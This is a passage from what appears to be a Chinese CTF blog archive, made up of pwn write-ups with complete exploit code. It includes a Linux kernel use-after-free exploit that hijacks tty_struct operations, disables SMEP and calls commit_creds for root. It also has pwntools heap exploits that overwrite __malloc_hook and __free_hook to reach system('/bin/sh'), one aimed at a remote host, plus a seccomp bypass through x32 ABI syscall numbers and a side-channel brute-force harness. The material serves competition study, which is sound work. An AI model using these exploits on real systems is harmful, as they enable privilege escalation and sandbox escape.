PTR_ERR(slave_inode); goto err_release; &#125; tty-&gt;link-&gt;driver_data = slave_inode; retval = ptm_driver-&gt;ops-&gt;open(tty, filp); if (retval) goto err_release; tty_debug_hangup(tty, "(tty count=%d)\n", tty-&gt;count); tty_unlock(tty); return 0;err_release: tty_unlock(tty); // This will also put-ref the fsi tty_release(inode, filp); return retval;out: devpts_kill_index(fsi, index);out_put_ref: devpts_put_ref(fsi);out_free_file: tty_free_file(filp); return retval;&#125; 关心的重点是在tty_struct这个堆空间是在哪里分配的，可以看到struct tty_struct *tty的赋值在767行 tty = tty_init_dev(ptm_driver, index);，该函数在\drivers\\tty\\tty_io.c 的1506行： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263struct tty_struct *tty_init_dev(struct tty_driver *driver, int idx)&#123; struct tty_struct *tty; int retval; /* * First time open is complex, especially for PTY devices. * This code guarantees that either everything succeeds and the * TTY is ready for operation, or else the table slots are vacated * and the allocated memory released. (Except that the termios * and locked termios may be retained.) */ if (!try_module_get(driver-&gt;owner)) return ERR_PTR(-ENODEV);--&gt; tty = alloc_tty_struct(driver, idx); if (!tty) &#123; retval = -ENOMEM; goto err_module_put; &#125; tty_lock(tty); retval = tty_driver_install_tty(driver, tty); if (retval &lt; 0) goto err_deinit_tty; if (!tty-&gt;port) tty-&gt;port = driver-&gt;ports[idx]; WARN_RATELIMIT(!tty-&gt;port, "%s: %s driver does not set tty-&gt;port. This will crash the kernel later. Fix the driver!\n", __func__, tty-&gt;driver-&gt;name); tty-&gt;port-&gt;itty = tty; /* * Structures all installed ... call the ldisc open routines. * If we fail here just call release_tty to clean up. No need * to decrement the use counts, as release_tty doesn't care. */ retval = tty_ldisc_setup(tty, tty-&gt;link); if (retval) goto err_release_tty; /* Return the tty locked so that it cannot vanish under the caller */ return tty;err_deinit_tty: tty_unlock(tty); deinitialize_tty_struct(tty); free_tty_struct(tty);err_module_put: module_put(driver-&gt;owner); return ERR_PTR(retval); /* call the tty release_tty routine to clean out this slot */err_release_tty: tty_unlock(tty); printk_ratelimited(KERN_INFO "tty_init_dev: ldisc open failed, " "clearing slot %d\n", idx); release_tty(tty, idx); return ERR_PTR(retval);&#125; 而其中，1522行调用了alloc_tty_struct(driver, idx)函数，最终可以看到在tty_io.c中的3140行，调用了kzalloc申请了sizeof(*tty)大小的堆空间，这也是题目中UAF堆块的由来。 1234567891011121314151617181920212223242526272829303132333435struct tty_struct *alloc_tty_struct(struct tty_driver *driver, int idx)&#123; struct tty_struct *tty; tty = kzalloc(sizeof(*tty), GFP_KERNEL); if (!tty) return NULL; kref_init(&amp;tty-&gt;kref); tty-&gt;magic = TTY_MAGIC; tty_ldisc_init(tty); tty-&gt;session = NULL; tty-&gt;pgrp = NULL; mutex_init(&amp;tty-&gt;legacy_mutex); mutex_init(&amp;tty-&gt;throttle_mutex); init_rwsem(&amp;tty-&gt;termios_rwsem); mutex_init(&amp;tty-&gt;winsize_mutex); init_ldsem(&amp;tty-&gt;ldisc_sem); init_waitqueue_head(&amp;tty-&gt;write_wait); init_waitqueue_head(&amp;tty-&gt;read_wait); INIT_WORK(&amp;tty-&gt;hangup_work, do_tty_hangup); mutex_init(&amp;tty-&gt;atomic_write_lock); spin_lock_init(&amp;tty-&gt;ctrl_lock); spin_lock_init(&amp;tty-&gt;flow_lock); INIT_LIST_HEAD(&amp;tty-&gt;tty_files); INIT_WORK(&amp;tty-&gt;SAK_work, do_SAK_work); tty-&gt;driver = driver; tty-&gt;ops = driver-&gt;ops; tty-&gt;index = idx; tty_line_name(driver, idx, tty-&gt;name); tty-&gt;dev = tty_get_device(tty); return tty;&#125; 而kzalloc定义在\include\linux\slab.h 1234static inline void *kzalloc(size_t size, gfp_t flags)&#123; return kmalloc(size, flags | __GFP_ZERO);&#125; 其实还是kmalloc…，定义在\include\linux\slab.h 446行 12345678910111213141516171819static __always_inline void *kmalloc(size_t size, gfp_t flags)&#123; if (__builtin_constant_p(size)) &#123; if (size &gt; KMALLOC_MAX_CACHE_SIZE) return kmalloc_large(size, flags);#ifndef CONFIG_SLOB if (!(flags &amp; GFP_DMA)) &#123; int index = kmalloc_index(size); if (!index) return ZERO_SIZE_PTR; return kmem_cache_alloc_trace(kmalloc_caches[index], flags, size); &#125;#endif &#125; return __kmalloc(size, flags);&#125; 对于UAF我当成还有另外一个想法，就是tty-&gt;ops如果也是通过kmalloc出来的，直接劫持虚表不是更好，不过显然不是。。。 漏洞利用思路0 此题没有开kaslr是本方法可以简易使用的必要条件 1 打开两个babydev设备，对其中一个设备使用ioctl命令，将size设置为tty_struct的大小，大小是0x2e0，但slab是一个以2对齐的结构，因此0x400以下，0x200以上应该都可以： 2 将其中一个设备释放掉，此时另外一个设备存在一个大小为0x400的被释放堆块。 3 使用open(“/dev/ptmx”, O_RDWR | O_NOCTTY)，进行堆喷射，使未关闭的babydev的指针指向一个tty_struct 4 对于如何拿到控制权，可以使用内核栈迁移的方法，利用如xchg esp , e?x的gadget，使内核栈迁移到一个可控制的低内存空间，即用户态空间。原因是在执行该指令时，寄存器的高8字节会被置为0。而在驱动中，调用tty_operations操作的最后一条汇编指令是call rax。因此，选择xchg esp,eax指令来做。 关于寻找内核的gadget，经过M4X师傅的分享，我放弃了ROPgadget，选择了ropper，速度比ROPgadget快许多。 如： 5 当我们可以迁移内核栈到用户态，且栈地址可以预测，则可利用mmap将这个地址申请下来，再填充ROP。ROP代码可以参考之前的文章。 6 通过题目中给的babyread和babywrite，将tty_struct的*op指针指向一个用户态空间，空间中将这个虚表的ioctl指针指向找到的栈迁移gadget 7 最终对之前open的/dev/ptmx进行ioctl操作就可以提权了 最终实验过程，我没有使用tty_struct的0x2e0大小，选用了0x3e0大小，同样可以触发漏洞，最终结果如下： EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;sched.h&gt;#include &lt;errno.h&gt;#include &lt;pty.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/sem.h&gt;struct _tty_operations &#123; struct tty_struct * (*lookup)(struct tty_driver *driver, struct inode *inode, int idx); int (*install)(struct tty_driver *driver, struct tty_struct *tty); void (*remove)(struct tty_driver *driver, struct tty_struct *tty); int (*open)(struct tty_struct * tty, struct file * filp); void (*close)(struct tty_struct * tty, struct file * filp); void (*shutdown)(struct tty_struct *tty); void (*cleanup)(struct tty_struct *tty); int (*write)(struct tty_struct * tty, unsigned char *buf, int count); int (*put_char)(struct tty_struct *tty, unsigned char ch); void (*flush_chars)(struct tty_struct *tty); int (*write_room)(struct tty_struct *tty); int (*chars_in_buffer)(struct tty_struct *tty); int (*ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg); long (*compat_ioctl)(struct tty_struct *tty, unsigned int cmd, unsigned long arg); void (*set_termios)(struct tty_struct *tty, struct ktermios * old); void (*throttle)(struct tty_struct * tty); void (*unthrottle)(struct tty_struct * tty); void (*stop)(struct tty_struct *tty); void (*start)(struct tty_struct *tty); void (*hangup)(struct tty_struct *tty); int (*break_ctl)(struct tty_struct *tty, int state); void (*flush_buffer)(struct tty_struct *tty); void (*set_ldisc)(struct tty_struct *tty); void (*wait_until_sent)(struct tty_struct *tty, int timeout); void (*send_xchar)(struct tty_struct *tty, char ch); int (*tiocmget)(struct tty_struct *tty); int (*tiocmset)(struct tty_struct *tty, unsigned int set, unsigned int clear); int (*resize)(struct tty_struct *tty, struct winsize *ws); int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew); int (*get_icount)(struct tty_struct *tty, struct serial_icounter_struct *icount); struct file_operations *proc_fops;&#125;;#define KERNCALL __attribute__((regparm(3)))void ( * commit_creds )(void *) KERNCALL ;size_t* (* prepare_kernel_cred)(void *) KERNCALL ;size_t swapgs = 0xffffffff81063694;size_t xchg_esp_eax = 0xFFFFFFFF81007808;//0xffffffff8100008a;size_t iretq = 0xffffffff814e35ef;size_t p_rdi = 0xffffffff810d238d;size_t write_cr4 = 0xFFFFFFFF810635B0;//unsigned long user_cs, user_ss, user_eflags;unsigned long user_cs, user_ss, user_eflags,user_sp ;void save_stats() &#123; asm( "movq %%cs, %0\n" "movq %%ss, %1\n" "movq %%rsp, %3\n" "pushfq\n" "popq %2\n" :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp) : : "memory" );&#125;void getshell()&#123; system("/bin/sh");&#125;void getroot()&#123; commit_creds= 0xffffffff810a1420; prepare_kernel_cred =0xffffffff810a1810; size_t cred = prepare_kernel_cred(0); commit_creds(cred);&#125;struct _tty_operations tty_operations;char buff[0x1000];size_t data[0X50];int main()&#123; puts("====================start======================="); tty_operations.ioctl = xchg_esp_eax; int i; char *fake_chunk ; //memset(data,0,0x30); save_stats(); int fd1=-1,fd2=-1; int trag[0x100]; fd1 = open("/dev/babydev",O_RDWR); if (fd1==-1)&#123; puts("fd1 open error"); &#125; printf("fd: %d",fd1); fd2 = open("/dev/babydev",O_RDWR); if (fd2==-1)&#123; puts("fd2 open error"); &#125; printf("fd: %d",fd2); puts("\n=================free chunk====================="); //ioctl(fd1,0x10001,0x2e0); ioctl(fd2,0x10001,0x3e0); close(fd2); puts("\n=================build mem ====================="); fake_chunk = mmap(xchg_esp_eax &amp; 0xfffff000, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); printf("build fake chunk at mem : %llx\n",fake_chunk); data[0] = p_rdi ; data[1] = 0x6f0 ; data[2] = write_cr4 ; data[3] = getroot; data[4] = swapgs; data[5] = fake_chunk+0x1000; data[6] = iretq; data[7] = getshell; data[8] = user_cs; data[9] = user_eflags; data[10]= user_sp; data[11]= user_ss; memcpy(xchg_esp_eax &amp; 0xffffffff,data,sizeof(data)); puts("\n=================SET VTABLE====================="); for(i=0;i&lt;0xff;i++)&#123; trag[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY); if (trag[i] &lt;= -1)&#123; puts("open error"); exit(-1); &#125; &#125; i = read(fd1,buff,0x40); printf("read: %d\n",i); for (i = 0 ;i &lt;8;i++)&#123; printf("%llx\n",(size_t )*(buff+i*8)); &#125; *(size_t *)(buff+3*8) = &amp;tty_operations; write(fd1,buff,0x40); puts("\n=================trag vul====================="); for(i=0;i&lt;0xff;i++)&#123; ioctl(trag[i],0,0); //printf("%d",i); &#125; &#125;]]></content>
      <tags>
        <tag>KERNEL</tag>
        <tag>PWN</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网鼎杯CTF部分PWN题复现]]></title>
    <url>%2F2018%2F08%2F27%2FWDBCTF-2018%2F</url>
    <content type="text"><![CDATA[题目链接 密码: 4qbr blind首先是blind题目，感觉我的做法和网上放的WP有点不一样，看网上放的EXP都是通过劫持.bss段上的STDOUT指针然后通过printf函数触发，学习了一波。 题目简介题目中给出3个功能，new、change、release。 new：可以申请6个堆块，堆块大小固定为0x68（实际分配0x70）大小的堆块，而在向堆块读入时会在读入数据后加\x00。 change: 没有什么特别的操作，只是单纯的根据bss段上的指针数组找到相应的堆块，然后限制写入大小为0x68. release：可以看到限制了release的次数，而这个变量在bss段上，并且在free以后没有对指针数组置零，形成悬垂指针，从而具有UAF、Double Free漏洞。 漏洞利用此题利用的难点在于这个程序没有泄露的功能和位置。 程序开启了除PIE的全部保护。 123456[*] &apos;/home/p4nda/Desktop/pwn/other/blind/blind&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 利用想法首先是利用Double Free和UAF了，由于程序操作的堆块大小都是0x70的，所以很直观的想法就是劫持0x70这个fastbin链，而对于0x70这个数值很敏感，由于libc内存地址是0x7fxxxxxx，因此可以通过错位构造，将__malloc_hook-0x23这个块被分配，但由于没有libc地址泄露，此方法不可行。然而，在bss段上还有另外的0x7fxxx，就是STDIN、STDOUT、STDERR， 而如果查看x/5gx 0x602045-8作为堆块，就会发现这个堆块大小为0x7f，当在fastbin链上的话，是可以分配的。 而这时，我们就可以对bss段进行写入，造成任意地址写了。但是由于got表不可以改，因此泄露成为一个问题。我想到的思路是让libc地址恰好出现在bss段上ptr[]数组内，这样就可以对libc地址进行任意写了。 又想到，当free时，是不会检查free的大小和位置的，只要任意构造符合要求的堆块大小就可以使其被释放到bin中，而在unsorted bin中的堆块，fd和bk会指向main_arena+88，这样就可以写libc了。 因此通过在bss段上构造一个地址为ptr-0x10，大小为0x100的内存块，然后将其free，就可以使ptr[0],ptr[1]指向main_arena+88了。 可以看到，堆块构造如上图，构造过程中必须保证0x100大小块的下一块标志位为1，并且构造下两块的标志位也为1，否则无法过free的检查。 在free掉该块以后，发现伪造的堆块进入unsorted bin。 当再次编辑时就可以修改bss段了，但是在这时发现一个特点，在这个版本的libc中将mainarena+88的最低位改成\x00，恰好变成\_malloc_hook-0x10。因此找到一个新的想法，题目所用的编辑函数中会在输入的末位写\x00，可以将ptr[4]，指向ptr[0]，在编辑时，可以将ptr[0]写成__malloc_hook-0x10，这样再次编辑ptr[0]就可以将__malloc_hook改成题目中给的system(“/bin/sh”)函数，从而拿到shell了。 EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#coding:utf-8from pwn import *debug = 0elf=ELF('./blind')ct = string.ascii_letters+string.digitsif debug: p = process('./blind') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' gdb.attach(p)else: p = remote('106.75.20.44', 9999) libc = ELF('./libc.so.6') context.log_level = 'debug'def new(index,content): p.recvuntil("Choice:") p.sendline('1') p.recvuntil('Index:') p.sendline(str(index)) p.recvuntil("Content:") p.send(content) p.recvuntil("Done")def change(index,content): p.recvuntil("Choice:") p.sendline('2') p.recvuntil('Index:') p.sendline(str(index)) p.recvuntil("Content:") p.send(content) p.recvuntil("Done")def free(index): p.recvuntil("Choice:") p.sendline('3') p.recvuntil('Index:') p.sendline(str(index))new(0,'p4nda\n')new(1,'p4nda\n')free(0)free(1)free(0)new(2,p64(0x602045-8)+'\n')new(3,'p4nda\n')new(4,'p4nda\n')new(5,'a'*3+p64(0x101)*2+p64(0x602060)+p64(0x602060)*2+p64(0)+p64(0x602140)*3+'\n')change(4,p64(0x21)*12+'\n')free(0)change(2,'\n')change(0,p64(0x4008E3)*3+'\n')p.recvuntil("Choice:")p.sendline('1')p.recvuntil('Index:')p.sendline(str(3))p.interactive() EasyCoin这题是AAA战队的ZUHXS师傅发给我的，也是遇上了一个神奇问题，在给我发的i64文件中switch语句没显示default，我也是懒没看汇编，就漏掉了格式化字符串漏洞 www 言归正传，这题最开始并没有什么想法，只是发现了功能实现上存在问题，可以给用户自身发送coin，然后delete时会存在一个不可控的free。最后根据别人的EXP调出来的，膜做出此题的师傅… 功能分析题目的功能比较多，首先是注册和登录，注册功能中有这样一个结构体： 其中username、password和结构体本身都是malloc(0x20)得到的0x30的内存块，coin_list这个指针最开始是置空的，后续操作中会用到。 在登录以后程序会维护一个结构体指针，根据这个指针指向的s_user结构体进行操作,共有display_user、send_coin、display_transaction、change_passwd、delete_user、logout操作。 在send_coin中出现了新的结构体s_coin 这个结构体是一个单链表，每一笔交易发生时，会分别向发送者和接受者新建并插入这个结构体，用id来标识交易，in_out标识是收到还是支出。同样的这个s_coin结构体也是也0x30大小的块。 在change_passwd函数中，会向结构体中指向的passwd指针写入数据。 最终delete_user中，会首先释放username、passwd指针，然后变量coin_list的所有coin，并从其他用户的coin_list中移除相应的s_coin并释放。 漏洞利用在整个程序中，只找到了用户可以向自己发送coin，而在delete时会触发一个释放位置地址的漏洞。 而程序在输入指令时，可以触发一个格式化字符串漏洞，通过格式化字符串漏洞可以泄露libc、堆地址。 此题的难点在于如何利用程序逻辑来对堆块进行UAF。 首先在释放的用户存在一个正常块时，释放后，由于不会对用户的coin_list进行操作，导致该链会指向fastbin链中的已释放部分。若正常逻辑也不会受到影响，但在这个coin_list上存在对自身转账的块时，就会在fastbin上寻找coin去释放，仅需利用fastbin上的脏数据即可释放一个正在用的块。 如图是释放了username、password的fastbin结构 如图是释放了一对正常交易块的堆结构 此时，可以看到该用户s_user指向的coin_list已经与fastbin有交集 而可以看到此处是预留的脏数据，可以使其指向user2-&gt;password块 而这个块中的id位置被预置为与当前查找的id相同，当运行到这里就可以使得user2-&gt;password被释放。 当delete运行结束后，可以看到fastbin链上存在一个可修改的块 而通过user2的change_passwd功能可以修改这个fastbin块的fd指针，如将其修改到user2本身的控制块结构体 此时被劫持的fastbin结构如下 看到这样的堆结构，可以通过新建一个用户，在设置用户密码时可以覆写user2的控制块，将其password成员指向__free_hook。 此时，由于password的只指向内容为\x00，因此使用\n就可登录，登录后修改密码为system地址。在delete时， 由于username是”/bin/sh”，就相当于调用了system(“/bin/sh”); 至此拿到了shell EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596from pwn import *debug = 1elf=ELF('./EasyCoin')if debug: p = process('./EasyCoin') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' gdb.attach(p,'b *0x401474')else: p = remote('106.75.20.44', 9999) #libc = ELF('./libc.so.6') context.log_level = 'debug'def reg(username, password): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('&gt; ') p.send(username) p.recvuntil('&gt; ') p.send(password) p.recvuntil('&gt; ') p.send(password)def login(username, password): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('&gt; ') p.send(username) p.recvuntil('&gt; ') p.send(password)def display_user(): p.recvuntil('&gt; ') p.sendline('1')def send_coin(username, money): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('&gt; ') p.send(username) p.recvuntil('&gt; ') p.sendline(str(money))def display_transactpn(): p.recvuntil('&gt; ') p.sendline('3')def change_password(password): p.recvuntil('&gt; ') p.sendline('4') p.recvuntil('&gt; ') p.send(password)def delete(): p.recvuntil('&gt; ') p.sendline('5')def logout(): p.recvuntil('&gt; ') p.sendline('6')reg('p4nda\n','pwn\n')reg('/bin/sh\n', '\x00'*0x10+'\x02')login('p4nda\n','pwn\n')p.recvuntil('&gt; ')p.send('%9$p')p.recvuntil('Command: ')heap_base = int(p.recvuntil('\x7f')[:-2], 16) - 0x10p.recvuntil('&gt; ')p.send('%3$p')p.recvuntil('Command: ')libc.address = int(p.recvuntil('\x7f')[:-2], 16)- 0xf72c0#- 7 - libc.symbols['__write_nocancel'] print '[*] system:',hex(libc.symbols['system'])print '[*] heap :',hex(heap_base)send_coin('/bin/sh\n',0x111)delete()reg('p4nda\n','pwn\n')login('p4nda\n','pwn\n')send_coin('/bin/sh\n',heap_base+0x100)send_coin('p4nda\n',0x3333)delete()login('/bin/sh',p64(heap_base+0x30))send_coin('/bin/sh',0x4444)#gdb.attach(p,'b *0x400b0f')change_password(p64(heap_base+0xa0-0x10))logout()reg("i_am_padding\n",p64(heap_base+0xd0)+p64(libc.symbols['__free_hook'])+p64(0xdeadbeef)+p64(0)[:-1])login('/bin/sh','\n')change_password(p64(libc.symbols['system'])+'\n')delete()p.interactive()]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CISCN 2018 Final赛记]]></title>
    <url>%2F2018%2F07%2F27%2FCISCN-Final%2F</url>
    <content type="text"><![CDATA[总而言之，我就觉得这次主办方的想法很有问题。尤其是最后在所有选手在场等了一个下午的情况下，没有给参赛队颁奖的环节，反而给什么优秀支撑单位、技术委员会颁了奖。这也是我第一次见过这样的设计，比赛在北京打，颁奖隔两天去武汉颁，谁有精力陪你折腾，而且没有任何通知，真的是mdzz。 //以上戾气有点大，这次比赛还是学了很多东西的，内容有点短，就当我水了一篇吧，实在是有的东西不想说了。 我们队分了一道CNSS战队plusls师傅出的一道PWN题，其中有一个seccomp沙箱，里面的逻辑是这样的。 看起来，没有什么问题，主要限制了open系列的系统调用，限制了这个以后，shell也没法起了。 比赛时，没有想到如何过这个限制。第一天打完了以后和plusls师傅交流了一下，感觉是个挺有意思的东西。 首先，线上赛那个题目逻辑挺复杂的，利用seccomp-tools简单复现了一下逻辑。 sandbox.asm 1234567891011A = archA == ARCH_X86_64 ? next : deadA = sys_numberA == open ? dead : nextA == mmap ? dead : nextA == ptrace ? dead : nextA == openat ? dead : nextA == open_by_handle_at ? dead : nextreturn ALLOWdead:return KILL 将沙箱逻辑使用seccomp-tools编译，将其转换为数组： 123456789101112131415161718┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/pwn/test/x32 abi] - [五 7月 27, 16:00]└─[$] &lt;&gt; seccomp-tools asm sandbox.asm -a amd64 -f carrayunsigned char bpf[] = &#123;32,0,0,0,4,0,0,0,21,0,0,7,62,0,0,192,32,0,0,0,0,0,0,0,21,0,5,0,2,0,0,0,21,0,4,0,9,0,0,0,21,0,3,0,101,0,0,0,21,0,2,0,1,1,0,0,21,0,1,0,48,1,0,0,6,0,0,0,0,0,255,127,6,0,0,0,0,0,0,0&#125;;┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/pwn/test/x32 abi] - [五 7月 27, 16:00]└─[$] &lt;&gt; seccomp-tools asm sandbox.asm -a amd64 -f raw | seccomp-tools disasm - line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x07 0xc000003e if (A != ARCH_X86_64) goto 0009 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x15 0x05 0x00 0x00000002 if (A == open) goto 0009 0004: 0x15 0x04 0x00 0x00000009 if (A == mmap) goto 0009 0005: 0x15 0x03 0x00 0x00000065 if (A == ptrace) goto 0009 0006: 0x15 0x02 0x00 0x00000101 if (A == openat) goto 0009 0007: 0x15 0x01 0x00 0x00000130 if (A == open_by_handle_at) goto 0009 0008: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0009: 0x06 0x00 0x00 0x00000000 return KILL 然后就可以编写程序逻辑了，这里我使用一个简化的demo，直接开沙箱执行shellcode： 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;#include &lt;sys/mman.h&gt;#include &lt;unistd.h&gt;#include &lt;seccomp.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;linux/filter.h&gt;#include &lt;linux/seccomp.h&gt;void sandbox()&#123; unsigned char bpf[] = &#123;32,0,0,0,4,0,0,0,21,0,0,7,62,0,0,192,32,0,0,0,0,0,0,0,21,0,5,0,2,0,0,0,21,0,4,0,9,0,0,0,21,0,3,0,101,0,0,0,21,0,2,0,1,1,0,0,21,0,1,0,48,1,0,0,6,0,0,0,0,0,255,127,6,0,0,0,0,0,0,0&#125;; prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0); struct sock_fprog sfp = &#123;10,bpf&#125;; //10代表沙箱规则条数 prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;sfp);&#125;int main()&#123; char * shellcode; void (*vul)(); puts("sandbox init"); write(1,"shellcode:",0x10); shellcode = mmap(0,0x1000,PROT_EXEC | PROT_READ |PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS,0,0); read(0,shellcode,0x1000); printf("call %p",shellcode); vul = shellcode; sandbox(); vul(); //shellcode();&#125; 此时，可以发现程序无法打开文件。 利用赛后交流时提到的X32 ABI，我后来搜索了一下，比较早出现这个东西的是BCTF的一道PWN题，和这个类似。看了一下发现这个东西方法是一个系统调用的两个调用号，官方的说法是0x40000000置了一个标准位。 然后，利用这一点，在调用open时，使用0x40000002，这个调用号就可以绕过沙箱，读出flag了。 123456789101112131415161718192021222324from pwn import *context(arch = 'amd64', os = 'linux', endian = 'little')context.log_level = 'debug'p = process("./vul")#sgdb.attach(p)shellcode = ''shellcode+= shellcraft.write(1,"input:",0x6)shellcode+= shellcraft.read(0,0x601200,0x20)shellcode+= ''' mov edi, 0x1010101 /* 6296064 == 0x601200 */ xor edi, 0x1611301 xor edx, edx /* 0 */ xor esi, esi /* 0 */ /* call open() */ push 0x40000002 /* 2 */ pop rax syscall\n'''shellcode+= shellcraft.read(3,0x601200,0x100)shellcode+= shellcraft.write(1,0x601200,0x100)p.send(asm(shellcode))p.recvuntil('input:')p.send('./flag\0')p.interactive() 参考： https://sites.google.com/site/x32abi/ https://blog.csdn.net/qq_29343201/article/details/72627528 https://github.com/david942j/seccomp-tools https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ 最后附上PPT]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【KERNEL PWN】0ctf 2018 final baby题解]]></title>
    <url>%2F2018%2F07%2F20%2F0ctf-baby%2F</url>
    <content type="text"><![CDATA[题目及相关下载 题目分析题目代码很简单，仅注册了ioctl函数，里面包含了两个case，在参数为0x6666时，可以泄露出bss段flag的地址。 在参数为0x1337时，用户输入是一个结构体，而传入驱动的是一个指针。 这个结构体应该是这样的： 12345struct _input &#123; char *flag; size_t len;&#125;; 对这个结构体指针进行一系列判断以后，会比较结构体中的flag指针指向的内容和长度，当比较的用户输入长度和内容都是flag时，使用printk打印flag内容。 仔细查看一下_chk_range_not_ok，看类C代码看不出什么意思，查看一下汇编代码： 1234567891011121314151617.text:0000000000000000 __chk_range_not_ok proc near ; CODE XREF: baby_ioctl+7B↓p.text:0000000000000000 ; baby_ioctl+BD↓p.text:0000000000000000 push rbp.text:0000000000000001 add rdi, rsi.text:0000000000000004 mov rbp, rsp.text:0000000000000007 jb short loc_11.text:0000000000000009 cmp rdx, rdi.text:000000000000000C setb al.text:000000000000000F pop rbp.text:0000000000000010 retn.text:0000000000000011 ; ---------------------------------------------------------------------------.text:0000000000000011.text:0000000000000011 loc_11: ; CODE XREF: __chk_range_not_ok+7↑j.text:0000000000000011 mov eax, 1.text:0000000000000016 pop rbp.text:0000000000000017 retn.text:0000000000000017 __chk_range_not_ok endp 可以看出，是将第一个参数和第二个参数相加，判断是否小于第三个参数，如果不小于将al置为1。 在动态调试的时候，发现第三个参数是一个常量： 0x7ffffffff000 这样的话，题目就很清楚了。判断的限制是传入的结构体+16，也就是整个结构体要在用户态中，并且结构体中第一个成员所指向的内存也要在用户态中。并且第二个参数要和bss段上的flag长度相等。这样会逐字节比较输入的flag是否等于bss保存的flag。 环境搭建和libc的pwn题不太一样，内核驱动的pwn需要驱动在一个版本的内核代码下编译，否则无法运行。 在程序代码中可以看到一个内核版本号——4.15.0-22-generic SMP mod_unload，我从官网源代码下载的版本只有4.15.0而没有-22的小版本。 此时，可以通过下载相应的内核deb包。 1apt download linux-image-4.15.0-22-generic 下载得到的linux-image-4.15.0-22-generic_4.15.0-22.24~16.04.1_amd64.deb中data.tar.xz下的boot中可以找到一个叫vmlinuz-4.15.0-22-generic的文件，这就是需要的内核映像。 此处需要明确文件的区别 //一定是我太菜才不知道 vmlinux：这个是编译出来原始的内核，未经过压缩，不能直接通过qemu启动，是一个ELF文件，里面包括了符号表等等一系列内核相关的指令，可以用IDA Pro查看，可以找gadget等等等等。类比于libc pwn中的libc-2.23.so之类的，给了这个东西就可以找gadget、找地址偏移等等。 bzImage：这个是vmlinux压缩以后，并且加上一段解压启动代码得到。这个东西可以放到QEMU中跑，但是不能用IDA打开。 *.cpio：这个东西一般都是打包生成的，最开始是从busybox中导出来的，类似于启动的文件系统吧（？）一般kernel pwn会在这里放*.ko。甚至放vmlinux… 漏洞利用环境搭建起来了，就可以看一下漏洞如何利用了。比赛中出现了两种解题方法，一种是预期解，另外一种是侧信道攻击。 侧信道攻击所谓侧信道攻击就是用能标明flag内容的方法，通过其他表现形式把flag爆破出来。 在程序中存在一个问题，就是在比较之前没有判断用户输入的flag段是否可读的，当输入的flag处于不可读段的时候，在比较时会触发段错误，从而造成kernel panic，利用这种现象可以用一下方法每次爆破一个字节的flag。 方法原理如下，利用mmap新建3个段，第一个、第三个权限设为000，第二可读写，并且每次将已有的flag防止在第二个段的最后，每次最后一个字节时爆破的字节，当这个字节和flag不符合时，内核驱动会退出，因此不触发错误。而当最后一个字节正确时，程序比较会下移一个字节，触发错误，引起kernel panic，从而可以判断出单字节的flag，原理如下： 这样测试33次就可以得到flag了。 EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// start.c // for start pwn.c#include &lt;stdio.h&gt;int main()&#123; char *ch = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%%&amp;\\'()*+,-./:;&lt;=&gt;?@[]^_`&#123;|&#125;~"; char input[34]= &#123;0&#125;; char order[0x100]; char order2[0x100]; FILE * fd = fopen("save.txt","a+"); fscanf(fd,"%s",input); for(int i = 1;i&lt;strlen(ch);i++)&#123; if (ch[i] == '\"' || ch[i] == '\\' || ch[i] == '`' )&#123; sprintf(order,"echo \"%s\\%c\" &gt; save.txt",input,ch[i]); sprintf(order2,"./pwn %s\\%c",input,ch[i] ); &#125; else&#123; sprintf(order,"echo \"%s%c\" &gt; save.txt",input,ch[i]); sprintf(order2,"./pwn %s%c",input,ch[i] ); &#125; printf("%s\n",order2); system(order); system(order2); //strcpy(order,"echo \""); //strcpy //system("") &#125;&#125;/*----------------------------------------------------------------------------------------*/// pwn.c// test per round#include 